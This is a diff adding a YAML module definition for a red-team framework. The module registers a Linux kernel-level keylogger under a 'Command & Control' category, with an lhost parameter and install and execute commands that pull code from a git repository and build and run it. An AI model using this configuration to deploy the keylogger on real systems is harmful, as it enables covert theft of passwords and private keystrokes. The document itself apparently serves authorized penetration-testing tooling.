@@ -1,0 +1,21 @@
+name: keylogger
+description: 'From the creators of LazyOwn Redteam Framework comes a free and open-source minimal production‑grade, low‑level keylogger for Linux systems that captures keystrokes directly from the kernel’s input subsystem (evdev). It operates as a daemon, logs every key press with microsecond precision, and supports keyboard modifiers (Shift, Ctrl, Alt, CapsLock). Designed for authorized security audits, penetration testing, system monitoring, and debugging input pipelines. This implementation is written in standard C, uses no external libraries beyond the GNU C library, and runs on any Linux kernel ≥ 2.6.
+  '
+author: LazyOwn RedTeam
+version: '1.0'
+enabled: true
+params:
+- name: lhost
+  type: string
+  required: true
+  description: lhost target.
+os: any
+trigger: []
+tool:
+  name: keylogger
+  repo_url: https://github.com/grisuno/keylogger.git
+  install_path: external/.exploit/keylogger
+  install_command: ./install.sh ; ./configure ; make ; make install
+  execute_command: git restore . ; git pull ; chmod +x *.sh && make run
+  download_file: /tmp/keylogger.pid
+category: 10. Command & Control
